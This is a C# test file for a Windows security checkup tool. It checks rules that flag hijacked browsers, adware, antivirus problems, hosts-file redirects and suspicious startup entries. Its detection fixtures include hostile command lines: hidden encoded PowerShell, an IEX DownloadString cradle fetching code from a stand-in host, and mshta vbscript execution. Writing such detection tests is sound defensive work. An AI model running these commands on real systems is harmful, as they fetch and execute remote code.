using NightTech.Shield.Core;

int failures = 0, passes = 0;
void Check(bool ok, string name)
{
    if (ok) passes++; else { failures++; Console.WriteLine("FAIL: " + name); }
}
var now = new DateTime(2026, 11, 3, 12, 0, 0, DateTimeKind.Utc);
List<Finding> Eval(ScanFacts f) => Rules.Evaluate(f, now);
ScanFacts Healthy() => new()
{
    Defender = new DefenderState { Present = true, RunningMode = "Normal", AntivirusEnabled = true, RealTime = true, TamperProtected = true, SignatureAgeDays = 0, QuickScanAgeDays = 1 },
    SecurityCenter = { new AvProduct { Name = "Windows Defender", Enabled = true, UpToDate = true } },
    Hosts = { "# Copyright (c) 1993-2009 Microsoft Corp.", "#      127.0.0.1       localhost", "127.0.0.1 localhost", "::1 localhost" },
};
bool Has(List<Finding> l, string idPrefix, Severity? s = null) => l.Any(f => f.Id.StartsWith(idPrefix, StringComparison.Ordinal) && (s is null || f.Severity == s));

// ---------- A clean PC has nothing to fix ----------
var clean = Eval(Healthy());
Check(clean.Count == 0, "healthy PC: no findings (" + string.Join("; ", clean.Select(f => f.Id)) + ")");
Check(new ScanResult { Findings = clean }.Worst is null, "healthy PC: worst is none");
Check(Report.Summary(new ScanResult { Findings = clean }) == "No problems found.", "healthy PC summary");

// ---------- Command lines ----------
var files = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { @"C:\Program Files\My App\app.exe", @"C:\Tools\run.exe" };
bool Exists(string p) => files.Contains(p);
Check(CommandLine.Split("\"C:\\Program Files\\My App\\app.exe\" /min", Exists) == (@"C:\Program Files\My App\app.exe", "/min"), "split quoted");
Check(CommandLine.Split(@"C:\Program Files\My App\app.exe /min", Exists) == (@"C:\Program Files\My App\app.exe", "/min"), "split unquoted with spaces");
Check(CommandLine.Split(@"C:\Tools\run -x", Exists) == (@"C:\Tools\run.exe", "-x"), "split adds .exe");
Check(CommandLine.Split(@"unknown.exe a b", Exists) == ("unknown.exe", "a b"), "split unknown falls back to first word");
Check(CommandLine.Split("", Exists) == ("", ""), "split empty");
Check(CommandLine.Split("\"C:\\no end", Exists).Program == @"C:\no end", "split unclosed quote");
Check(CommandLine.BaseName(@"C:\Windows\System32\rundll32.exe") == "rundll32", "basename");
Check(CommandLine.IsScriptHost(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"), "powershell is a script host");
Check(!CommandLine.IsScriptHost(@"C:\Program Files\App\app.exe"), "app is not a script host");
Check(CommandLine.Payload("rundll32.exe", @"C:\Users\a\AppData\Roaming\x\evil.dll,Start") == @"C:\Users\a\AppData\Roaming\x\evil.dll", "rundll32 payload");
Check(CommandLine.Payload("rundll32.exe", "\"C:\\Users\\a b\\evil.dll\",Start") == @"C:\Users\a b\evil.dll", "rundll32 quoted payload");
Check(CommandLine.Payload("wscript.exe", @"//B //nologo C:\Users\a\AppData\Roaming\run.vbs") == @"C:\Users\a\AppData\Roaming\run.vbs", "wscript payload after switches");
Check(CommandLine.Payload("app.exe", "x") == "", "no payload for normal program");

// ---------- Startup items ----------
StartupItem S(string command, string program, bool? signed = true, bool? exists = true, string name = "Item") =>
    new() { Kind = StartupKind.RegistryValue, Where = "Run (this user)", Location = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", Name = name, Command = command, Program = program, Signed = signed, ProgramExists = exists };
Check(Rules.JudgeStartup(S("\"C:\\Program Files\\Zoom\\Zoom.exe\" --autostart", @"C:\Program Files\Zoom\Zoom.exe")) is null, "signed Program Files app is fine");
Check(Rules.JudgeStartup(S(@"C:\Users\a\AppData\Local\Discord\Update.exe --processStart Discord.exe", @"C:\Users\a\AppData\Local\Discord\Update.exe")) is null, "signed AppData app is fine");
var enc = Rules.JudgeStartup(S(@"powershell.exe -w hidden -enc SQBFAFgA", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"));
Check(enc?.Severity == Severity.Risk && enc.Value.Recommended, "hidden encoded powershell is a risk");
var dl = Rules.JudgeStartup(S("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\"", "powershell"));
Check(dl?.Severity == Severity.Risk, "download cradle is a risk");
var mshta = Rules.JudgeStartup(S("mshta.exe vbscript:Execute(\"x\")", @"C:\Windows\System32\mshta.exe"));
Check(mshta?.Severity == Severity.Risk, "mshta vbscript is a risk");
var vbs = Rules.JudgeStartup(S(@"wscript.exe //B C:\Users\a\AppData\Roaming\Microsoft\upd.vbs", @"C:\Windows\System32\wscript.exe"));
Check(vbs?.Severity == Severity.Risk, "vbs from AppData is a risk");
var dll = Rules.JudgeStartup(S(@"rundll32.exe C:\ProgramData\abc\lib.dll,Run", @"C:\Windows\System32\rundll32.exe"));
Check(dll?.Severity == Severity.Warning && !dll.Value.Recommended, "rundll32 of a ProgramData dll is a warning, not ticked");
var tempUnsigned = Rules.JudgeStartup(S(@"C:\Users\a\AppData\Local\Temp\x7f.exe", @"C:\Users\a\AppData\Local\Temp\x7f.exe", signed: false));
Check(tempUnsigned?.Severity == Severity.Risk && tempUnsigned.Value.Recommended, "unsigned temp program is a risk");
var tempSigned = Rules.JudgeStartup(S(@"C:\Users\a\Downloads\setup.exe", @"C:\Users\a\Downloads\setup.exe", signed: true));
Check(tempSigned?.Severity == Severity.Warning && !tempSigned.Value.Recommended, "signed Downloads program is a warning");
var missing = Rules.JudgeStartup(S(@"C:\Program Files\Gone\gone.exe", @"C:\Program Files\Gone\gone.exe", exists: false));
Check(missing?.Severity == Severity.Info && missing.Value.Recommended, "missing program is info, safe to turn off");
var unsignedAppData = Rules.JudgeStartup(S(@"C:\Users\a\AppData\Roaming\tool\tool.exe", @"C:\Users\a\AppData\Roaming\tool\tool.exe", signed: false));
Check(unsignedAppData?.Severity == Severity.Warning && !unsignedAppData.Value.Recommended, "unsigned AppData program is a warning, not ticked");
var unsignedProgramFiles = Rules.JudgeStartup(S(@"C:\Program Files\Old\old.exe", @"C:\Program Files\Old\old.exe", signed: false));
Check(unsignedProgramFiles is null, "unsigned Program Files program isn't flagged");
var adwareStart = Rules.JudgeStartup(S(@"C:\Program Files\OneLaunch\onelaunch.exe", @"C:\Program Files\OneLaunch\onelaunch.exe", name: "OneLaunch"));
Check(adwareStart?.Severity == Severity.Warning && adwareStart.Value.Recommended, "adware startup is flagged by name");
var f1 = Healthy(); f1.Startup.Add(S(@"powershell.exe -enc AAAA", "powershell.exe", name: "Updater"));
var e1 = Eval(f1);
Check(e1.Count == 1 && e1[0].Fix == FixKind.DisableStartup && e1[0].FixData.SequenceEqual(new[] { "RegistryValue", @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Updater" }), "startup finding carries what the fix needs");

// ---------- Programs ----------
Check(Rules.BadProgram("KMSpico 10.2")?.Severity == Severity.Risk, "KMSpico is a risk");
Check(Rules.BadProgram("KMSAuto Net")?.Severity == Severity.Risk, "KMSAuto is a risk");
Check(Rules.BadProgram("Wave Browser")?.Severity == Severity.Warning, "Wave Browser");
Check(Rules.BadProgram("Driver Booster 11")?.Severity == Severity.Warning, "Driver Booster");
Check(Rules.BadProgram("Advanced SystemCare 17")?.Severity == Severity.Warning, "Advanced SystemCare");
foreach (var good in new[] { "Google Chrome", "Microsoft Edge", "Zoom Workplace", "NVIDIA Graphics Driver 560.94", "Intel(R) Driver & Support Assistant", "Adobe Acrobat (64-bit)",
             "Microsoft 365 Apps for business", "Malwarebytes version 5.1", "WinRAR 7.13", "Waves MaxxAudio", "Waveform Audio", "Microsoft Search in Bing", "Shift4 Payments", "Holafly" })
    Check(Rules.BadProgram(good) is null, "not flagged: " + good);
var f2 = Healthy();
f2.Programs.Add(new InstalledProgram { Name = "OneLaunch", UninstallCommand = "\"C:\\x\\unins000.exe\"", RegistryKey = @"HKCU\...\OneLaunch" });
f2.Programs.Add(new InstalledProgram { Name = "AnyDesk", UninstallCommand = "\"C:\\x\\AnyDesk.exe\" --uninstall", RegistryKey = @"HKLM\...\AnyDesk" });
f2.Programs.Add(new InstalledProgram { Name = "OneLaunch", UninstallCommand = "x", RegistryKey = "dup" });
f2.Programs.Add(new InstalledProgram { Name = "Restoro", UninstallCommand = "" });
var e2 = Eval(f2);
Check(e2.Count(f => f.Id == "program:OneLaunch") == 1, "duplicate programs listed once");
Check(e2.Single(f => f.Id == "program:OneLaunch").Recommended, "adware uninstall is ticked");
Check(e2.Single(f => f.Id == "remote:AnyDesk") is { Recommended: false, Fix: FixKind.Uninstall }, "remote tool offered but not ticked");
Check(e2.Single(f => f.Id == "program:Restoro").Fix == FixKind.None, "no uninstaller: no fix button");

// ---------- Antivirus ----------
var f3 = Healthy(); f3.Defender.RealTime = false; f3.Defender.SignatureAgeDays = 9; f3.Defender.QuickScanAgeDays = 20; f3.Defender.TamperProtected = false;
var e3 = Eval(f3);
Check(Has(e3, "defender:realtime", Severity.Risk), "real-time off is a risk");
Check(Has(e3, "defender:definitions", Severity.Risk), "9-day-old definitions are a risk");
Check(Has(e3, "defender:scan", Severity.Warning), "no scan in 20 days");
Check(Has(e3, "defender:tamper", Severity.Warning) && !e3.Single(f => f.Id == "defender:tamper").Recommended, "tamper protection: shown, not ticked");
var f3b = Healthy(); f3b.Defender.SignatureAgeDays = 4;
Check(Has(Eval(f3b), "defender:definitions", Severity.Warning), "4-day-old definitions are a warning");
var f4 = Healthy(); f4.Defender.RunningMode = "Passive Mode";
f4.SecurityCenter.Add(new AvProduct { Name = "Bitdefender Antivirus", Enabled = true, UpToDate = true });
var e4 = Eval(f4);
Check(e4.Count == 1 && e4[0].Id == "av:other" && e4[0].Severity == Severity.Info, "another antivirus in charge: info only");
var f5 = Healthy(); f5.Defender.RunningMode = "Passive Mode";
f5.SecurityCenter.Add(new AvProduct { Name = "Norton 360", Enabled = true, UpToDate = false });
f5.SecurityCenter.Add(new AvProduct { Name = "McAfee", Enabled = true, UpToDate = true });
var e5 = Eval(f5);
Check(Has(e5, "av:several", Severity.Warning) && Has(e5, "av:outdated:Norton 360", Severity.Risk), "two antivirus and an expired one");
var f6 = Healthy(); f6.Defender = new DefenderState(); f6.SecurityCenter.Clear();
Check(Has(Eval(f6), "av:none", Severity.Risk), "no antivirus at all");
var f7 = Healthy(); f7.Defender.AntivirusEnabled = false; f7.SecurityCenter[0].Enabled = false;
Check(Has(Eval(f7), "defender:off", Severity.Risk), "Defender off, nothing else");
var f7b = Healthy(); f7b.Defender.QuickScanAgeDays = 65535;
Check(Eval(f7b).Single().Detail.Contains("never"), "never scanned");
Check(AvProduct.FromProductState("Windows Defender", 0x61100) is { Enabled: true, UpToDate: true }, "product state on and current");
Check(AvProduct.FromProductState("X", 0x60110) is { Enabled: false, UpToDate: false }, "product state off and old");

// ---------- Threats ----------
Check(ThreatRecord.FromStatusId(1) == ThreatStatus.Active && ThreatRecord.FromStatusId(3) == ThreatStatus.Quarantined
      && ThreatRecord.FromStatusId(4) == ThreatStatus.Removed && ThreatRecord.FromStatusId(103) == ThreatStatus.Failed
      && ThreatRecord.FromStatusId(5) == ThreatStatus.Allowed && ThreatRecord.FromStatusId(99) == ThreatStatus.Unknown, "threat status ids");
Check(ThreatRecord.SeverityName(5) == "Severe" && ThreatRecord.SeverityName(3) == "Unknown", "severity names");
var f8 = Healthy();
f8.Threats.Add(new ThreatRecord { ThreatId = "1", Name = "Trojan:Win32/Wacatac.B!ml", Severity = "Severe", Status = ThreatStatus.Active, Resources = { @"file:_C:\Users\a\Downloads\crack.exe" } });
f8.Threats.Add(new ThreatRecord { ThreatId = "2", Name = "PUA:Win32/Presenoker", Status = ThreatStatus.Quarantined, DetectedUtc = now.AddDays(-3) });
f8.Threats.Add(new ThreatRecord { ThreatId = "3", Name = "Old", Status = ThreatStatus.Removed, DetectedUtc = now.AddDays(-90) });
f8.Threats.Add(new ThreatRecord { ThreatId = "4", Name = "HackTool:Win32/AutoKMS", Status = ThreatStatus.Allowed });
var e8 = Eval(f8);
var active = e8.Single(f => f.Id == "threat:1");
Check(active.Severity == Severity.Risk && active.Fix == FixKind.RemoveThreats && active.Detail.Contains(@"C:\Users\a\Downloads\crack.exe") && !active.Detail.Contains("file:_"), "active threat with clean path");
Check(e8[0].Id == "threat:1", "active threat listed first");
Check(e8.Single(f => f.Id == "threat:recent").Detail.Contains("Presenoker") && !e8.Single(f => f.Id == "threat:recent").Detail.Contains("Old"), "recent threats only");
Check(Has(e8, "threat-allowed:4", Severity.Warning), "allowed threat is a warning");

// ---------- Browsers ----------
var f9 = Healthy();
f9.Browsers.Add(new BrowserProfile
{
    Browser = "Chrome", Profile = "Default", ProfilePath = @"C:\u\Default", SearchUrl = "https://search.wavebrowser.co/?q={searchTerms}",
    StartupUrls = { "https://find.mystart.example/", "https://www.mybank.example/" },
    Extensions = { new BrowserExtension { Id = "a", Name = "PDF Converter Pro", FromStore = false }, new BrowserExtension { Id = "b", Name = "uBlock Origin", FromStore = true },
                   new BrowserExtension { Id = "c", Name = "Disabled Thing", FromStore = false, Enabled = false } },
});
f9.Browsers.Add(new BrowserProfile { Browser = "Edge", Profile = "Default", ProfilePath = @"C:\u\EdgeDefault", SearchUrl = "https://www.bing.com/search?q={searchTerms}" });
var e9 = Eval(f9);
Check(e9.Single(f => f.Id.StartsWith("search:")) is { Fix: FixKind.ResetBrowser, Recommended: true } s9 && s9.Detail.Contains("search.wavebrowser.co"), "hijacked search found with host");
var pages9 = e9.Single(f => f.Id.StartsWith("pages:"));
Check(pages9.Detail.Contains("find.mystart.example") && !pages9.Detail.Contains("mybank"), "hijacked start page found, bank page left alone");
Check(e9.Count(f => f.Id.StartsWith("ext:")) == 1, "only the enabled side-loaded extension is flagged");
Check(e9.Single(f => f.Id.StartsWith("exts:")).Severity == Severity.Info, "store extensions listed as info");
Check(!e9.Any(f => f.Title.StartsWith("Edge")), "Bing search on Edge is fine");

// ---------- Policies ----------
var f10 = Healthy();
f10.Policies.Add(new BrowserPolicy { Browser = "Chrome", Setting = "ExtensionInstallForcelist", Key = @"HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist", ValueName = "1", Value = "abcdefgh;https://clients2.google.com/service/update2/crx" });
f10.Policies.Add(new BrowserPolicy { Browser = "Chrome", Setting = "ExtensionInstallForcelist", Key = @"HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist", ValueName = "2", Value = "zzz" });
var e10 = Eval(f10);
var pol = e10.Single();
Check(pol.Severity == Severity.Risk && pol.Fix == FixKind.RemovePolicy && pol.FixData.Count == 2 && pol.FixData[0].EndsWith("ExtensionInstallForcelist|1"), "forced extensions at home are a risk with both values");
f10.DomainJoined = true;
Check(Eval(f10).Single() is { Severity: Severity.Info, Fix: FixKind.None }, "work PC policy is info");

// ---------- Hosts ----------
var hostsLines = new List<string>
{
    "# comment", "127.0.0.1 localhost", "185.12.3.4 www.paypal.com paypal.com # phishing", "0.0.0.0 update.microsoft.com", "0.0.0.0 adservice.google.com",
    "192.168.1.20 nas.local", "0.0.0.0 www.malwarebytes.com", "10.0.0.5 notgoogle.com", "0.0.0.0 vortex.data.microsoft.com",
};
var entries = Rules.ParseHosts(hostsLines);
Check(entries.Count(e => e.Line == 2) == 2 && entries.First(e => e.Line == 2).Host == "www.paypal.com", "hosts line with two names and a comment");
Check(Rules.IsProtected("www.paypal.com") && Rules.IsProtected("paypal.com") && Rules.IsProtected("accounts.google.com") && Rules.IsProtected("google.co.uk"), "protected names");
Check(!Rules.IsProtected("notgoogle.com") && !Rules.IsProtected("nas.local") && !Rules.IsProtected("paypal.com.evil.test"), "lookalikes aren't protected names");
var f11 = Healthy(); f11.Hosts = hostsLines;
var e11 = Eval(f11);
var redirect = e11.Single(f => f.Id == "hosts:redirect");
Check(redirect.Severity == Severity.Risk && redirect.Detail.Contains("www.paypal.com goes to 185.12.3.4"), "paypal redirect is a risk");
var blocked = e11.Single(f => f.Id == "hosts:block");
Check(blocked.Detail.Contains("update.microsoft.com") && blocked.Detail.Contains("malwarebytes") && !blocked.Detail.Contains("vortex") && !blocked.Detail.Contains("adservice"), "security blocks found, ad and telemetry blocks left alone");
Check(redirect.FixData.OrderBy(x => x).SequenceEqual(new[] { "2", "3", "6" }), "fix lines: paypal, update, malwarebytes");
var other = e11.Single(f => f.Id == "hosts:other");
Check(other.Severity == Severity.Info && other.Detail.Contains("nas.local"), "other entries are info");
var big = Healthy(); for (int i = 0; i < 300; i++) big.Hosts.Add($"0.0.0.0 ads{i}.example");
Check(Eval(big).Single().Detail.Contains("ad-blocking"), "big ad-block list recognized");
var commented = HostsFile.CommentOut(hostsLines, new[] { 2, 0 }, now);
Check(commented[2].StartsWith(HostsFile.Marker) && commented[2].EndsWith("185.12.3.4 www.paypal.com paypal.com # phishing") && commented[0] == "# comment" && commented.Count == hostsLines.Count, "hosts comment-out keeps the line");

// ---------- Proxy ----------
var f12 = Healthy(); f12.Proxy = new ProxyState { Enabled = true, Server = "45.77.1.2:8080" };
Check(Eval(f12).Single() is { Id: "proxy", Severity: Severity.Warning, Recommended: true }, "unknown proxy is a warning");
f12.Proxy = new ProxyState { Enabled = false, AutoConfigUrl = "http://wpad.evil.test/proxy.pac" };
Check(Eval(f12).Single().Detail.Contains("wpad.evil.test"), "auto-config script counts even when the proxy box is off");
f12.Proxy = new ProxyState { Enabled = true, Server = "http=127.0.0.1:8888;https=127.0.0.1:8888" };
Check(Eval(f12).Single() is { Id: "proxy:local", Severity: Severity.Info, Recommended: false }, "local proxy is info");
f12.Proxy = new ProxyState { Enabled = true, Server = "proxy.corp:3128" }; f12.DomainJoined = true;
Check(Eval(f12).Single() is { Severity: Severity.Info, Fix: FixKind.None }, "work proxy is info");
f12.Proxy = new ProxyState { Enabled = false, Server = "1.2.3.4:80" };
Check(Eval(f12).Count == 0, "proxy switched off isn't reported");

// ---------- Ordering and summary ----------
var mixed = Eval(f8.Startup.Count == 0 ? f8 : f8);
Check(mixed.Select(f => (int)f.Severity).SequenceEqual(mixed.Select(f => (int)f.Severity).OrderByDescending(x => x)), "most serious first");
var r = new ScanResult { ToolVersion = "1.0.0", Facts = f8, Findings = e8 };
Check(Report.Summary(r) == "1 serious problem and 1 thing worth fixing.", "summary wording: " + Report.Summary(r));

// ---------- Browser files ----------
var tmp = Path.Combine(Path.GetTempPath(), "shieldtest-" + Guid.NewGuid().ToString("N"));
try
{
    var prof = Path.Combine(tmp, "User Data", "Default");
    Directory.CreateDirectory(prof);
    File.WriteAllText(Path.Combine(prof, "Preferences"), """
        {"profile":{"name":"Person 1"},
         "default_search_provider_data":{"template_url_data":{"url":"https://search.example-hijack.test/q?{searchTerms}"}},
         "session":{"restore_on_startup":4,"startup_urls":["https://start.example.test/"]},
         "homepage":"https://home.example.test/","homepage_is_newtabpage":false,
         "extensions":{"settings":{
           "aaa":{"location":1,"from_webstore":true,"manifest":{"name":"Good Store Ext"}},
           "bbb":{"location":4,"path":"C:\\x\\ext","manifest":{"name":"Unpacked Ext"}},
           "ccc":{"location":5,"manifest":{"name":"Component"}},
           "ddd":{"location":3,"from_webstore":false,"manifest":{"name":"__MSG_appName__"},"path":"ddd\\1.0_0"},
           "eee":{"location":1,"disable_reasons":[1],"manifest":{"name":"Off Ext"}},
           "fff":{"location":1,"manifest":{"name":"Chrome Web Store Payments"}}}}}
        """);
    var loc = Path.Combine(prof, "Extensions", "ddd", "1.0_0", "_locales", "en");
    Directory.CreateDirectory(loc);
    File.WriteAllText(Path.Combine(prof, "Extensions", "ddd", "1.0_0", "manifest.json"), """{"name":"__MSG_appName__","default_locale":"en"}""");
    File.WriteAllText(Path.Combine(loc, "messages.json"), """{"appName":{"message":"Coupon Finder"}}""");
    File.WriteAllText(Path.Combine(prof, "Secure Preferences"), """{"extensions":{"settings":{"ggg":{"location":8,"manifest":{"name":"Loaded By Command Line"}}}}}""");
    Directory.CreateDirectory(Path.Combine(tmp, "User Data", "Crashpad"));
    var profiles = BrowserReader.Chromium(Path.Combine(tmp, "User Data"), "Chrome");
    Check(profiles.Count == 1, "one profile read");
    var p = profiles[0];
    Check(p.Profile == "Person 1" && p.SearchUrl.Contains("example-hijack") && p.StartupUrls.SequenceEqual(new[] { "https://start.example.test/" }) && p.HomePage == "https://home.example.test/", "profile settings read");
    Check(!p.Extensions.Any(e => e.Name is "Component" or "Chrome Web Store Payments"), "built-in extensions skipped");
    Check(p.Extensions.Single(e => e.Id == "aaa").FromStore == true, "store extension");
    Check(p.Extensions.Single(e => e.Id == "bbb").FromStore == false, "unpacked extension");
    Check(p.Extensions.Single(e => e.Id == "ddd") is { Name: "Coupon Finder", FromStore: false }, "localized name from messages.json; external install");
    Check(!p.Extensions.Single(e => e.Id == "eee").Enabled, "disabled extension");
    Check(p.Extensions.Single(e => e.Id == "ggg").FromStore == false, "Secure Preferences extensions read");

    var notes = new List<string>();
    var badProf = Path.Combine(tmp, "Bad Data", "Default");
    Directory.CreateDirectory(badProf);
    File.WriteAllText(Path.Combine(badProf, "Preferences"), "{not json");
    Check(BrowserReader.Chromium(Path.Combine(tmp, "Bad Data"), "Edge", notes).Count == 0 && notes.Count == 1, "unreadable profile becomes a note");
    Check(BrowserReader.Chromium(Path.Combine(tmp, "nope"), "Brave").Count == 0, "missing browser is skipped");

    var ff = Path.Combine(tmp, "Profiles", "abcd.default-release");
    Directory.CreateDirectory(ff);
    File.WriteAllText(Path.Combine(ff, "prefs.js"), "user_pref(\"browser.startup.homepage\", \"https://search.ffhijack.test/|https://two.test\");\n");
    File.WriteAllText(Path.Combine(ff, "extensions.json"), """
        {"addons":[{"id":"ub@x","type":"extension","location":"app-profile","active":true,"defaultLocale":{"name":"uBlock Origin"}},
                   {"id":"side@x","type":"extension","location":"app-profile","foreignInstall":true,"active":true,"defaultLocale":{"name":"Sideloaded"}},
                   {"id":"sys@x","type":"extension","location":"app-system-defaults","defaultLocale":{"name":"System"}},
                   {"id":"t@x","type":"theme","location":"app-profile","defaultLocale":{"name":"Dark"}}]}
        """);
    var fx = BrowserReader.Firefox(Path.Combine(tmp, "Profiles"));
    Check(fx.Count == 1 && fx[0].HomePage == "https://search.ffhijack.test/", "Firefox home page");
    Check(fx[0].Extensions.Count == 2 && fx[0].Extensions.Single(e => e.Name == "Sideloaded").FromStore == false && fx[0].Extensions.Single(e => e.Name == "uBlock Origin").FromStore == true, "Firefox add-ons");

    // ---------- Undo log ----------
    var logPath = Path.Combine(tmp, "log", "undo.json");
    var log = UndoLog.Load(logPath);
    Check(log.Changes.Count == 0, "new log is empty");
    var c = log.Add(new Change { Kind = ChangeKind.RegistryValue, Title = "Stopped \"Updater\"", Data = { ["Key"] = @"HKCU\Run", ["Name"] = "Updater", ["Type"] = "String", ["Value"] = "x.exe" } }, now);
    log.Add(new Change { Kind = ChangeKind.Record, Title = "Uninstalled OneLaunch" }, now.AddMinutes(1));
    log.Save(logPath);
    var back = UndoLog.Load(logPath);
    Check(back.Changes.Count == 2 && back.Changes[0].Get("Value") == "x.exe" && back.Changes[0].Kind == ChangeKind.RegistryValue, "log round trip");
    Check(back.Undoable.Count() == 1, "records can't be undone");
    back.Changes[0].UndoneUtc = now; back.Save(logPath);
    Check(UndoLog.Load(logPath).Undoable.Count() == 0, "undone changes drop off");
    File.WriteAllText(logPath, "{broken");
    Check(UndoLog.Load(logPath).Changes.Count == 0 && Directory.GetFiles(Path.GetDirectoryName(logPath)!, "undo.json.damaged-*").Length == 1, "damaged log kept aside");

    // ---------- Reports ----------
    f8.Computer = "<PC>"; f8.Windows = "Windows 11 Home"; f8.TakenUtc = now;
    var html = Report.Html(r, back.Changes);
    Check(html.Contains("&lt;PC&gt;") && !html.Contains("<PC>") && html.Contains("(864) 381-8510") && html.Contains("Colossians 3:23"), "html report encoded and branded");
    var text = Report.Text(r, back.Changes);
    Check(text.Contains("Fix now") && text.Contains("Changes made") && text.Contains("nighttech.solutions") && text.Contains("can't promise"), "text report");
}
finally
{
    try { Directory.Delete(tmp, true); } catch (IOException) { }
}

Console.WriteLine($"{passes} passed, {failures} failed");
return failures == 0 ? 0 : 1;
